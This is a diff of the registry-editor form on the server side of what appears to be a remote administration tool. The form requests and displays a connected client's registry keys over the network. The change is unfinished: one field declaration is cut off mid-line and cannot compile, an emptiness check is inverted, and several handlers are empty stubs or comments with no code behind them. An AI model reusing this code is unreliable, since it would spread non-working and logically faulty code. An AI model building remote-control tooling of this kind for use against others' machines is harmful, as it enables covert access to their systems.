@@ -3,19 +3,17 @@ using System.Collections.Generic;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using xServer.Core.Networking;
+using xServer.Core.Utilities;
 
 namespace xServer.Forms
 {
     public partial class FrmRegistryEditor : Form
     {
-        // Notes: Use Microsoft.Win32.RegistryHive as a part of the packet to and from
-        //        the client to represent the referenced top-level node.
-
-        // To-Do: Migrate some of this code to a RegistryHelper.cs class.
-
         private readonly Client _connectClient;
 
-        private RegistryHive currentClientHive = RegistryHive.ClassesRoot;
+        private readonly object locker = new object();
+
+        public Dictionary<TreeNode, 
 
         public FrmRegistryEditor(Client c)
         {
@@ -34,102 +32,43 @@ namespace xServer.Forms
             }
         }
 
-        private TreeNode LoadRootSubKeyDirectories(RegistryKey key, int depth = 4)
+        public void AddRootKey(RegistryKey key)
         {
-            if (key != null && depth > 0)
+            tvRegistryDirectory.Invoke((MethodInvoker)delegate
             {
-                TreeNode rootNode = new TreeNode(key.Name) { Tag = key };
+            TreeNode node = CreateNode(key.Name, key.Name, key);
+            tvRegistryDirectory.Nodes.Add(node);
 
-                try
-                {
-                    foreach (string subKeyName in key.GetSubKeyNames())
-                    {
-                        try
-                        {
-                            TreeNode subNode = new TreeNode(subKeyName);
+            node.Nodes.Add(new TreeNode());
+            });
+        }
 
-                            using (RegistryKey SubKey = key.OpenSubKey(subKeyName))
-                            {
-                                subNode.Tag = SubKey;
-
-                                if (SubKey != null)
-                                {
-                                    TreeNode lowerNode = LoadSubKeyDirectories(SubKey, depth--);
-
-                                    // Load more sub-key directories, but with decrementing levels of depth.
-                                    if (lowerNode != null)
-                                    {
-                                        subNode.Nodes.Add(lowerNode);
-                                    }
-                                }
-                            }
-
-                            rootNode.Nodes.Add(subNode);
-                        }
-                        catch
-                        { }
-                    }
-
-                    return rootNode;
-                }
-                catch
-                {
-                    return rootNode;
-                }
-            }
-            else
+        private TreeNode CreateNode(string key, string text, object tag)
+        {
+            return new TreeNode()
             {
-                return null;
+                Text = text,
+                Name = key,
+                Tag = tag
+            };
+        }
+
+        public void AddKeyToTree(TreeNode parent, RegistryKeyEx subKey)
+        {
+            RegistryKey key = subKey.Key;
+            TreeNode newNode = CreateNode(key.Name, subKey.Name, key);
+            parent.Nodes.Add(newNode);
+
+            // If it contains more nodes, prepare for additional keys to be added to the new node.
+            if (key.SubKeyCount > 0)
+            {
+                newNode.Nodes.Add(new TreeNode());
             }
         }
 
-        private TreeNode LoadSubKeyDirectories(RegistryKey key, int depth = 4)
+        public  void PopulateLstRegistryKeys(RegistryKey[] keys)
         {
-            if (key != null && depth > 0)
-            {
-                TreeNode subNode = null;
-
-                try
-                {
-                    subNode = new TreeNode(key.Name);
-
-                    foreach (string subKeyName in key.GetSubKeyNames())
-                    {
-                        try
-                        {
-                            using (RegistryKey SubKey = key.OpenSubKey(subKeyName))
-                            {
-                                if (SubKey != null)
-                                {
-                                    TreeNode lowerNode = LoadSubKeyDirectories(SubKey, depth--);
-
-                                    // Load more sub-key directories, but with decrementing levels of depth.
-                                    if (lowerNode != null)
-                                    {
-                                        subNode.Nodes.Add(lowerNode);
-                                    }
-                                }
-                            }
-                        }
-                        catch
-                        { }
-                    }
-                }
-                catch
-                {
-                    return null;
-                }
-
-                return subNode;
-            }
-            else
-            {
-                return null;
-            }
-        }
-
-        private void PopulateLstRegistryKeys(RegistryKey[] keys)
-        {
+            // Clear the ListView.
             for (int i = 0; i < lstRegistryKeys.Items.Count; i++)
             {
                 RegistryKey key = lstRegistryKeys.Items[i].Tag as RegistryKey;
@@ -141,7 +80,8 @@ namespace xServer.Forms
 
             lstRegistryKeys.Clear();
 
-            if (keys != null)
+            // If the array is not null, we have usable data.
+            if (keys != null && keys.Length > 0)
             {
                 for (int i = 0; i < keys.Length; i++)
                 {
@@ -156,23 +96,97 @@ namespace xServer.Forms
             if ((tvRegistryDirectory.SelectedNode != null) && (tvRegistryDirectory.SelectedNode.Tag != null))
             {
                 List<RegistryKey> KeysFromNode = new List<RegistryKey>();
-                foreach (object obj in (object[])tvRegistryDirectory.SelectedNode.Tag)
-                {
-                    RegistryKey key = obj as RegistryKey;
-                    if (key != null)
-                    {
-                        KeysFromNode.Add(key);
-                    }
-                }
+                
+                // Send a request for registry keys on this node.
+                new xServer.Core.Packets.ServerPackets.DoLoadRegistryKey(tvRegistryDirectory.SelectedNode).Execute(_connectClient);
 
-                PopulateLstRegistryKeys(KeysFromNode.ToArray());
+                // Validate the response... Make sure it is referencing a valid node.
+
+                // The handler will add the response data to the ListView.
+
+                if (KeysFromNode.Count < 1)
+                {
+                    // If there are valid keys to use from the selected TreeNode, populate the ListView with it.
+                    PopulateLstRegistryKeys(KeysFromNode.ToArray());
+                }
+                else
+                {
+                    // If there aren't, send null to clear the ListView.
+                    PopulateLstRegistryKeys(null);
+                }
             }
+            else
+            {
+                // It is likely that the user clicked on either an empty direction or an invalid RegistryKey.
+                // Sending null to this method will clear the ListView.
+                PopulateLstRegistryKeys(null);
+            }
+        }
+
+        private void FrmRegistryEditor_Load(object sender, EventArgs e)
+        {
+            // Send packet to obtain the root nodes.
         }
 
         private void FrmRegistryEditor_FormClosing(object sender, FormClosingEventArgs e)
         {
             if (_connectClient.Value.FrmRe != null)
                 _connectClient.Value.FrmRe = null;
+        }
+
+        private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
+        {
+            // After the Tree Node label text is edited, 
+        }
+
+        private void tvRegistryDirectory_AfterSelect(object sender, TreeViewEventArgs e)
+        {
+
+        }
+
+        private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
+        {
+            // Before expansion of the node, prepare the first node with RegistryKeys.
+            TreeNode parentNode = e.Node;
+
+            // If nothing is there (yet).
+            if (parentNode.FirstNode.Tag == null)
+            {
+                try
+                {
+                    tvRegistryDirectory.SuspendLayout();
+
+                    // Send a packet to retrieve the data to use for the nodes.
+
+                    parentNode.Nodes.Clear();
+                    RegistryKey key = parentNode.Tag as RegistryKey;
+
+                    if (key != null)
+                    {
+                        // Get sub-keys, sort them, then add them to the tree.
+                        
+                    }
+                }
+                finally
+                {
+                    ResumeLayout();
+                }
+            }
+        }
+
+        private void tvRegistryDirectory_KeyDown(object sender, KeyEventArgs e)
+        {
+
+        }
+
+        private void tvRegistryDirectory_MouseUp(object sender, MouseEventArgs e)
+        {
+
+        }
+
+        private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
+        {
+
         }
     }
 }
